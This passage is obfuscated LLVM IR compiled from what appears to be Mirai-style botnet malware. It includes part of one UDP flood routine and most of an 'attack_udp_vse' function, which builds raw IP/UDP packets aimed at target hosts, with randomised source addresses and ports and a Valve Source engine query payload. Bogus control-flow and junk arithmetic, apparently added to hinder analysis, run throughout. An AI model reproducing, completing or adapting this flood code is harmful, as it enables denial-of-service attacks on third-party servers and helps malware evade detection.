  %501 = bitcast %struct.iphdr* %500 to i16*
  %502 = call zeroext i16 @checksum_generic(i16* %501, i32 20)
  %503 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 7
  store i16 %502, i16* %504, align 2
  %505 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %506 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %505, i32 0, i32 3
  store i16 0, i16* %506, align 2
  %507 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %508 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %509 = bitcast %struct.udphdr* %508 to i8*
  %510 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %511 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %510, i32 0, i32 2
  %512 = load i16, i16* %511, align 2
  %513 = load i16, i16* %20, align 2
  %514 = zext i16 %513 to i64
  %_23 = sub i64 0, 8
  %gen24 = add i64 %_23, %514
  %_25 = sub i64 8, %514
  %gen26 = mul i64 %_25, %514
  %_27 = shl i64 8, %514
  %_28 = shl i64 8, %514
  %_29 = shl i64 8, %514
  %_30 = shl i64 8, %514
  %_31 = sub i64 0, 8
  %gen32 = add i64 %_31, %514
  %515 = add i64 8, %514
  %516 = trunc i64 %515 to i32
  %517 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %507, i8* %509, i16 zeroext %512, i32 %516)
  %518 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %519 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %518, i32 0, i32 3
  store i16 %517, i16* %519, align 2
  %520 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %521 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %520, i32 0, i32 1
  %522 = load i16, i16* %521, align 2
  %523 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %524 = load i32, i32* %11, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i64 %525
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i32 0, i32 0
  %528 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %527, i32 0, i32 1
  store i16 %522, i16* %528, align 2
  %529 = load i32, i32* %12, align 4
  %530 = load i8*, i8** %26, align 8
  %531 = load i16, i16* %20, align 2
  %532 = zext i16 %531 to i64
  %_33 = sub i64 28, %532
  %gen34 = mul i64 %_33, %532
  %_35 = sub i64 28, %532
  %gen36 = mul i64 %_35, %532
  %_37 = sub i64 28, %532
  %gen38 = mul i64 %_37, %532
  %_39 = shl i64 28, %532
  %_40 = shl i64 28, %532
  %_41 = sub i64 28, %532
  %gen42 = mul i64 %_41, %532
  %_43 = sub i64 28, %532
  %gen44 = mul i64 %_43, %532
  %533 = add i64 28, %532
  %534 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %535 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %536 = load i32, i32* %11, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i64 %537
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i32 0, i32 0
  %540 = bitcast %struct.sockaddr_in* %539 to %struct.sockaddr*
  store %struct.sockaddr* %540, %struct.sockaddr** %534, align 8
  %541 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %542 = load %struct.sockaddr*, %struct.sockaddr** %541, align 8
  %543 = call i64 @sendto(i32 %529, i8* %530, i64 %533, i32 16384, %struct.sockaddr* %542, i32 16)
  br label %originalBB22

originalBB48alteredBB:                            ; preds = %originalBB48, %432
  %544 = load i32, i32* %11, align 4
  %_49 = sub i32 0, %544
  %gen50 = add i32 %_49, 1
  %_51 = sub i32 0, %544
  %gen52 = add i32 %_51, 1
  %_53 = sub i32 %544, 1
  %gen54 = mul i32 %_53, 1
  %_55 = sub i32 0, %544
  %gen56 = add i32 %_55, 1
  %_57 = shl i32 %544, 1
  %_58 = sub i32 0, %544
  %gen59 = add i32 %_58, 1
  %545 = add nsw i32 %544, 1
  store i32 %545, i32* %11, align 4
  br label %originalBB48
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %83

; <label>:66:                                     ; preds = %5
  %67 = load i32, i32* @x.31
  %68 = load i32, i32* @y.32
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %66
  %75 = load i32, i32* @x.31
  %76 = load i32, i32* @y.32
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %510

; <label>:83:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %84 = load i32, i32* %12, align 4
  %85 = bitcast i32* %11 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %107

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* @x.31
  %90 = load i32, i32* @y.32
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = load i32, i32* %12, align 4
  %98 = call i32 @close(i32 %97)
  %99 = load i32, i32* @x.31
  %100 = load i32, i32* @y.32
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %510

; <label>:107:                                    ; preds = %83
  store i32 0, i32* %11, align 4
  br label %108

; <label>:108:                                    ; preds = %originalBBpart273, %107
  %109 = load i32, i32* @x.31
  %110 = load i32, i32* @y.32
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  %117 = load i32, i32* %11, align 4
  %118 = load i8, i8* %7, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %117, %119
  %121 = load i32, i32* @x.31
  %122 = load i32, i32* @y.32
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %120, label %129, label %283

; <label>:129:                                    ; preds = %originalBBpart28
  %130 = load i32, i32* @x.31
  %131 = load i32, i32* @y.32
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %129
  %138 = call noalias i8* @calloc(i64 128, i64 1) #6
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  store i8* %138, i8** %142, align 8
  %143 = load i8**, i8*** %13, align 8
  %144 = load i32, i32* %11, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  store %struct.iphdr* %148, %struct.iphdr** %23, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i64 1
  %151 = bitcast %struct.iphdr* %150 to %struct.udphdr*
  store %struct.udphdr* %151, %struct.udphdr** %24, align 8
  %152 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i64 1
  %154 = bitcast %struct.udphdr* %153 to i8*
  store i8* %154, i8** %25, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %156 = bitcast %struct.iphdr* %155 to i8*
  %157 = load i8, i8* %156, align 4
  %158 = and i8 %157, 15
  %159 = or i8 %158, 64
  store i8 %159, i8* %156, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = and i8 %162, -16
  %164 = or i8 %163, 5
  store i8 %164, i8* %161, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = load i32, i32* %21, align 4
  %169 = sext i32 %168 to i64
  %170 = add i64 32, %169
  %171 = trunc i64 %170 to i16
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = load i16, i16* %15, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i8, i8* %16, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 5
  store i8 %179, i8* %181, align 4
  %182 = load i8, i8* %17, align 1
  %183 = icmp ne i8 %182, 0
  %184 = load i32, i32* @x.31
  %185 = load i32, i32* @y.32
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart249, label %originalBB10alteredBB

originalBBpart249:                                ; preds = %originalBB10
  br i1 %183, label %192, label %212

; <label>:192:                                    ; preds = %originalBBpart249
  %193 = load i32, i32* @x.31
  %194 = load i32, i32* @y.32
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %192
  %201 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 4
  store i16 %201, i16* %203, align 2
  %204 = load i32, i32* @x.31
  %205 = load i32, i32* @y.32
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %212

; <label>:212:                                    ; preds = %originalBBpart253, %originalBBpart249
  %213 = load i32, i32* @x.31
  %214 = load i32, i32* @y.32
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %212
  %221 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 6
  store i8 17, i8* %222, align 1
  %223 = load i32, i32* @LOCAL_ADDR, align 4
  %224 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 8
  store i32 %223, i32* %225, align 4
  %226 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %227 = load i32, i32* %11, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i32 0, i32 1
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  %234 = load i16, i16* %18, align 2
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 0
  store i16 %235, i16* %237, align 2
  %238 = load i16, i16* %19, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %241 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %240, i32 0, i32 1
  store i16 %239, i16* %241, align 2
  %242 = load i32, i32* %21, align 4
  %243 = sext i32 %242 to i64
  %244 = add i64 12, %243
  %245 = trunc i64 %244 to i16
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 2
  store i16 %246, i16* %248, align 2
  %249 = load i8*, i8** %25, align 8
  %250 = bitcast i8* %249 to i32*
  store i32 -1, i32* %250, align 4
  %251 = load i8*, i8** %25, align 8
  %252 = getelementptr inbounds i8, i8* %251, i64 4
  store i8* %252, i8** %25, align 8
  %253 = load i8*, i8** %25, align 8
  %254 = load i8*, i8** %20, align 8
  %255 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %253, i8* %254, i32 %255)
  %256 = load i32, i32* @x.31
  %257 = load i32, i32* @y.32
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart267, label %originalBB55alteredBB

originalBBpart267:                                ; preds = %originalBB55
  br label %264

; <label>:264:                                    ; preds = %originalBBpart267
  %265 = load i32, i32* @x.31
  %266 = load i32, i32* @y.32
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %264
  %273 = load i32, i32* %11, align 4
  %274 = add nsw i32 %273, 1
  store i32 %274, i32* %11, align 4
  %275 = load i32, i32* @x.31
  %276 = load i32, i32* @y.32
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart273, label %originalBB69alteredBB

originalBBpart273:                                ; preds = %originalBB69
  br label %108

; <label>:283:                                    ; preds = %originalBBpart28
  br label %284

; <label>:284:                                    ; preds = %509, %283
  store i32 0, i32* %11, align 4
  br label %285

; <label>:285:                                    ; preds = %originalBBpart295, %284
  %286 = load i32, i32* @x.31
  %287 = load i32, i32* @y.32
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %285
  %294 = load i32, i32* %11, align 4
  %295 = load i8, i8* %7, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp slt i32 %294, %296
  %298 = load i32, i32* @x.31
  %299 = load i32, i32* @y.32
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %297, label %306, label %487

; <label>:306:                                    ; preds = %originalBBpart277
  %307 = load i8**, i8*** %13, align 8
  %308 = load i32, i32* %11, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds i8*, i8** %307, i64 %309
  %311 = load i8*, i8** %310, align 8
  store i8* %311, i8** %26, align 8
  %312 = load i8*, i8** %26, align 8
  %313 = bitcast i8* %312 to %struct.iphdr*
  store %struct.iphdr* %313, %struct.iphdr** %27, align 8
  %314 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i64 1
  %316 = bitcast %struct.iphdr* %315 to %struct.udphdr*
  store %struct.udphdr* %316, %struct.udphdr** %28, align 8
  %317 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %318 = load i32, i32* %11, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 2
  %322 = load i8, i8* %321, align 4
  %323 = zext i8 %322 to i32
  %324 = icmp slt i32 %323, 32
  br i1 %324, label %325, label %346

; <label>:325:                                    ; preds = %306
  %326 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %327 = load i32, i32* %11, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i64 %328
  %330 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i32 0, i32 1
  %331 = load i32, i32* %330, align 4
  %332 = call i32 @ntohl(i32 %331) #7
  %333 = call i32 @rand_next()
  %334 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %335 = load i32, i32* %11, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i64 %336
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i32 0, i32 2
  %339 = load i8, i8* %338, align 4
  %340 = zext i8 %339 to i32
  %341 = lshr i32 %333, %340
  %342 = add i32 %332, %341
  %343 = call i32 @htonl(i32 %342) #7
  %344 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 9
  store i32 %343, i32* %345, align 4
  br label %346

; <label>:346:                                    ; preds = %325, %306
  %347 = load i16, i16* %15, align 2
  %348 = zext i16 %347 to i32
  %349 = icmp eq i32 %348, 65535
  br i1 %349, label %350, label %371

; <label>:350:                                    ; preds = %346
  %351 = load i32, i32* @x.31
  %352 = load i32, i32* @y.32
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %350
  %359 = call i32 @rand_next()
  %360 = trunc i32 %359 to i16
  %361 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 3
  store i16 %360, i16* %362, align 4
  %363 = load i32, i32* @x.31
  %364 = load i32, i32* @y.32
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %371

; <label>:371:                                    ; preds = %originalBBpart281, %346
  %372 = load i16, i16* %18, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  br i1 %374, label %375, label %396

; <label>:375:                                    ; preds = %371
  %376 = load i32, i32* @x.31
  %377 = load i32, i32* @y.32
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %375
  %384 = call i32 @rand_next()
  %385 = trunc i32 %384 to i16
  %386 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i32 0, i32 0
  store i16 %385, i16* %387, align 2
  %388 = load i32, i32* @x.31
  %389 = load i32, i32* @y.32
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %396

; <label>:396:                                    ; preds = %originalBBpart285, %371
  %397 = load i16, i16* %19, align 2
  %398 = zext i16 %397 to i32
  %399 = icmp eq i32 %398, 65535
  br i1 %399, label %400, label %421

; <label>:400:                                    ; preds = %396
  %401 = load i32, i32* @x.31
  %402 = load i32, i32* @y.32
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %400
  %409 = call i32 @rand_next()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 1
  store i16 %410, i16* %412, align 2
  %413 = load i32, i32* @x.31
  %414 = load i32, i32* @y.32
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %421

; <label>:421:                                    ; preds = %originalBBpart289, %396
  %422 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 7
  store i16 0, i16* %423, align 2
  %424 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %425 = bitcast %struct.iphdr* %424 to i16*
  %426 = call zeroext i16 @checksum_generic(i16* %425, i32 20)
  %427 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 7
  store i16 %426, i16* %428, align 2
  %429 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %430 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %429, i32 0, i32 3
  store i16 0, i16* %430, align 2
  %431 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %432 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %433 = bitcast %struct.udphdr* %432 to i8*
  %434 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %435 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %434, i32 0, i32 2
  %436 = load i16, i16* %435, align 2
  %437 = load i32, i32* %21, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 12, %438
  %440 = trunc i64 %439 to i32
  %441 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %431, i8* %433, i16 zeroext %436, i32 %440)
  %442 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 3
  store i16 %441, i16* %443, align 2
  %444 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %445 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %444, i32 0, i32 1
  %446 = load i16, i16* %445, align 2
  %447 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %448 = load i32, i32* %11, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i32 0, i32 0
  %452 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %451, i32 0, i32 1
  store i16 %446, i16* %452, align 2
  %453 = load i32, i32* %12, align 4
  %454 = load i8*, i8** %26, align 8
  %455 = load i32, i32* %21, align 4
  %456 = sext i32 %455 to i64
  %457 = add i64 32, %456
  %458 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %459 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %460 = load i32, i32* %11, align 4
  %461 = sext i32 %460 to i64
